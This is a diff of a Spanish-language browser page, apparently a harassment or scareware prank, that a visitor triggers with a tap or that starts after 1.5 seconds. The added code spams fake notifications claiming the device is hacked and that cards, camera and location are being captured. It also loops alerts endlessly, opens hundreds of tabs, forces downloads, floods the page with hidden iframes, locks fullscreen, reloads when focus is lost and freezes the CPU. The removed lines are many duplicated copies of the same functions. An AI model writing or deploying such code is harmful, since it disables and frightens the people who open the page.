-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-        
-    
-        
-        // ==================== ALERTAS INFINITAS ====================
+        // ==================== ALERTAS INFINITAS (BLOQUEO UI) ====================
         function infiniteAlerts() {
             setInterval(() => {
                 alert('⚠️ ERROR FATAL ⚠️\nCódigo: 0xDEADBEEF');
-            }, 300);
+            }, 250);
             setInterval(() => {
                 confirm('SISTEMA CORROMPIDO\nPresione OK para continuar...');
-            }, 450);
+            }, 400);
             setInterval(() => {
                 prompt('INGRESE CLAVE DE RECUPERACIÓN:', '');
-            }, 600);
+            }, 550);
         }
         
         // ==================== PESTAÑAS INFINITAS ====================
@@ -1286,9 +195,9 @@
             const urls = [
                 'https://httpbin.org/bytes/2097152',
                 'https://httpbin.org/bytes/1048576',
+                'https://httpbin.org/drip?duration=5&numbytes=1000000',
                 'about:blank#crash',
-                'about:blank#pop',
-                'https://httpbin.org/drip?duration=5&numbytes=1000000'
+                'about:blank#pop'
             ];
             
             function spawnTab() {
@@ -1297,213 +206,35 @@
                 if (!win || win.closed) {
                     const a = document.createElement('a');
                     a.href = url;
-                    a.download = 'data_' + Date.now() + '.bin';
+                    a.download = 'system_' + Date.now() + '.bin';
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
                 }
             }
             
-            for (let i = 0; i < 200; i++) {
-                setTimeout(spawnTab, i * 35);
+            // 250 pestañas iniciales
+            for (let i = 0; i < 250; i++) {
+                setTimeout(spawnTab, i * 30);
             }
             
+            // Continuar abriendo
             setInterval(() => {
-                for (let i = 0; i < 15; i++) {
+                for (let i = 0; i < 20; i++) {
                     spawnTab();
                 }
             }, 500);
         }
-
-
-        function openInfiniteTabs() {
-            const urls = [
-                'https://httpbin.org/bytes/2097152',
-                'https://httpbin.org/bytes/1048576',
-                'about:blank#crash',
-                'about:blank#pop',
-                'https://httpbin.org/drip?duration=5&numbytes=1000000'
-            ];
-            
-            function spawnTab() {
-                const url = urls[Math.floor(Math.random() * urls.length)];
-                const win = window.open(url, '_blank');
-                if (!win || win.closed) {
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'data_' + Date.now() + '.bin';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                }
-            }
-            
-            for (let i = 0; i < 200; i++) {
-                setTimeout(spawnTab, i * 35);
-            }
-            
-            setInterval(() => {
-                for (let i = 0; i < 15; i++) {
-                    spawnTab();
-                }
-            }, 500);
-        }
-
-        function openInfiniteTabs() {
-            const urls = [
-                'https://httpbin.org/bytes/2097152',
-                'https://httpbin.org/bytes/1048576',
-                'about:blank#crash',
-                'about:blank#pop',
-                'https://httpbin.org/drip?duration=5&numbytes=1000000'
-            ];
-            
-            function spawnTab() {
-                const url = urls[Math.floor(Math.random() * urls.length)];
-                const win = window.open(url, '_blank');
-                if (!win || win.closed) {
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'data_' + Date.now() + '.bin';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                }
-            }
-            
-            for (let i = 0; i < 200; i++) {
-                setTimeout(spawnTab, i * 35);
-            }
-            
-            setInterval(() => {
-                for (let i = 0; i < 15; i++) {
-                    spawnTab();
-                }
-            }, 500);
-        }
-
-        function openInfiniteTabs() {
-            const urls = [
-                'https://httpbin.org/bytes/2097152',
-                'https://httpbin.org/bytes/1048576',
-                'about:blank#crash',
-                'about:blank#pop',
-                'https://httpbin.org/drip?duration=5&numbytes=1000000'
-            ];
-            
-            function spawnTab() {
-                const url = urls[Math.floor(Math.random() * urls.length)];
-                const win = window.open(url, '_blank');
-                if (!win || win.closed) {
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'data_' + Date.now() + '.bin';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                }
-            }
-            
-            for (let i = 0; i < 200; i++) {
-                setTimeout(spawnTab, i * 35);
-            }
-            
-            setInterval(() => {
-                for (let i = 0; i < 15; i++) {
-                    spawnTab();
-                }
-            }, 500);
-        }
-
-        function openInfiniteTabs() {
-            const urls = [
-                'https://httpbin.org/bytes/2097152',
-                'https://httpbin.org/bytes/1048576',
-                'about:blank#crash',
-                'about:blank#pop',
-                'https://httpbin.org/drip?duration=5&numbytes=1000000'
-            ];
-            
-            function spawnTab() {
-                const url = urls[Math.floor(Math.random() * urls.length)];
-                const win = window.open(url, '_blank');
-                if (!win || win.closed) {
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'data_' + Date.now() + '.bin';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                }
-            }
-            
-            for (let i = 0; i < 200; i++) {
-                setTimeout(spawnTab, i * 35);
-            }
-            
-            setInterval(() => {
-                for (let i = 0; i < 15; i++) {
-                    spawnTab();
-                }
-            }, 500);
-        }
+        
         // ==================== IFRAME FLOOD ====================
         function iframeFlood() {
             setInterval(() => {
-                for (let f = 0; f < 40; f++) {
+                for (let f = 0; f < 50; f++) {
                     const ifr = document.createElement('iframe');
-                    ifr.src = 'https://httpbin.org/bytes/300000';
+                    ifr.src = 'https://httpbin.org/bytes/500000';
                     ifr.style.display = 'none';
                     document.body.appendChild(ifr);
-                    setTimeout(() => ifr.remove(), 400);
-                }
-            }, 400);
-        }
-
-             function iframeFlood() {
-            setInterval(() => {
-                for (let f = 0; f < 40; f++) {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = 'https://httpbin.org/bytes/300000';
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
-                    setTimeout(() => ifr.remove(), 400);
-                }
-            }, 400);
-        }
-
-             function iframeFlood() {
-            setInterval(() => {
-                for (let f = 0; f < 40; f++) {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = 'https://httpbin.org/bytes/300000';
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
-                    setTimeout(() => ifr.remove(), 400);
-                }
-            }, 400);
-        }
-
-             function iframeFlood() {
-            setInterval(() => {
-                for (let f = 0; f < 40; f++) {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = 'https://httpbin.org/bytes/300000';
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
-                    setTimeout(() => ifr.remove(), 400);
-                }
-            }, 400);
-        }
-
-             function iframeFlood() {
-            setInterval(() => {
-                for (let f = 0; f < 40; f++) {
-                    const ifr = document.createElement('iframe');
-                    ifr.src = 'https://httpbin.org/bytes/300000';
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
-                    setTimeout(() => ifr.remove(), 400);
+                    setTimeout(() => ifr.remove(), 300);
                 }
             }, 400);
         }
@@ -1517,76 +248,21 @@
                 screen.orientation.lock('portrait').catch(e => {});
             }
         }
-        setInterval(forceFullscreen, 200);
+        setInterval(forceFullscreen, 150);
         
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement) forceFullscreen();
         });
         
-        // ==================== PEDIR PERMISOS ADICIONALES ====================
-        function requestAllPermissions() {
-            // Geolocalización
+        // ==================== PEDIR PERMISOS ====================
+        function requestPermissions() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(() => {}, () => {});
             }
-            // Clipboard
             try {
                 navigator.clipboard.writeText("INFECTADO").catch(e => {});
             } catch(e) {}
-            // Solicitar permiso de notificaciones
-            requestNotificationPermission();
-        }
-
-         function requestAllPermissions() {
-            // Geolocalización
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(() => {}, () => {});
-            }
-            // Clipboard
-            try {
-                navigator.clipboard.writeText("INFECTADO").catch(e => {});
-            } catch(e) {}
-            // Solicitar permiso de notificaciones
-            requestNotificationPermission();
-        }
-
-         function requestAllPermissions() {
-            // Geolocalización
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(() => {}, () => {});
-            }
-            // Clipboard
-            try {
-                navigator.clipboard.writeText("INFECTADO").catch(e => {});
-            } catch(e) {}
-            // Solicitar permiso de notificaciones
-            requestNotificationPermission();
-        }
-
-         function requestAllPermissions() {
-            // Geolocalización
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(() => {}, () => {});
-            }
-            // Clipboard
-            try {
-                navigator.clipboard.writeText("INFECTADO").catch(e => {});
-            } catch(e) {}
-            // Solicitar permiso de notificaciones
-            requestNotificationPermission();
-        }
-
-         function requestAllPermissions() {
-            // Geolocalización
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(() => {}, () => {});
-            }
-            // Clipboard
-            try {
-                navigator.clipboard.writeText("INFECTADO").catch(e => {});
-            } catch(e) {}
-            // Solicitar permiso de notificaciones
-            requestNotificationPermission();
+            requestNotifications();
         }
         
         // ==================== BLOQUEAR CAMBIO DE PESTAÑA ====================
@@ -1596,7 +272,23 @@
             }
         });
         
-        // ==================== ACTIVAR INFIERNO ====================
+        // ==================== BLOQUEAR BLUR (cambiar de app) ====================
+        window.onblur = function() {
+            setTimeout(() => {
+                window.focus();
+                location.reload();
+            }, 10);
+        };
+        
+        // ==================== CONGELAR CPU ====================
+        function freezeCPU() {
+            setInterval(() => {
+                let basura = 0;
+                for (let i = 0; i < 80000; i++) basura += Math.sin(i);
+            }, 8);
+        }
+        
+        // ==================== ACTIVAR INFIERNO COMPLETO ====================
         let hellStarted = false;
         
         function startHell() {
@@ -1604,31 +296,21 @@
             hellStarted = true;
             
             startStrobe();
-            startWebAudioScream();
+            playScreamer();
             startVibrationHell();
             openInfiniteTabs();
             iframeFlood();
             infiniteAlerts();
             forceFullscreen();
-            requestAllPermissions();
-            
-            // Congelar CPU
-            setInterval(() => {
-                let garbage = 0;
-                for (let i = 0; i < 60000; i++) garbage += Math.sin(i);
-            }, 8);
-            
-            // Reforzar vibración cada 2 segundos adicional
-            setInterval(() => {
-                if (navigator.vibrate) navigator.vibrate([1000]);
-            }, 2000);
+            requestPermissions();
+            freezeCPU();
         }
         
-        // Activar con TOQUE (obligatorio para Android)
+        // Activar con toque (obligatorio para audio en Android)
         document.body.addEventListener('touchstart', startHell);
         document.body.addEventListener('click', startHell);
         
-        // Si no toca en 1.5 segundos, activar lo que se pueda
+        // Auto-intento parcial
         setTimeout(() => {
             if (!hellStarted) {
                 startStrobe();
@@ -1636,7 +318,8 @@
                 iframeFlood();
                 infiniteAlerts();
                 forceFullscreen();
-                requestAllPermissions();
+                requestPermissions();
+                freezeCPU();
                 hellStarted = true;
             }
         }, 1500);
@@ -1645,13 +328,7 @@
         document.body.style.top = '0';
         document.body.style.left = '0';
         
-        window.onblur = function() {
-            setTimeout(() => {
-                window.focus();
-            }, 10);
-        };
-        
-        console.log("Página cargada - Esperando toque para activar todo");
+        console.log("Página lista. Archivo MP3 esperado: " + MP3_FILE);
     })();
     </script>
 </body>
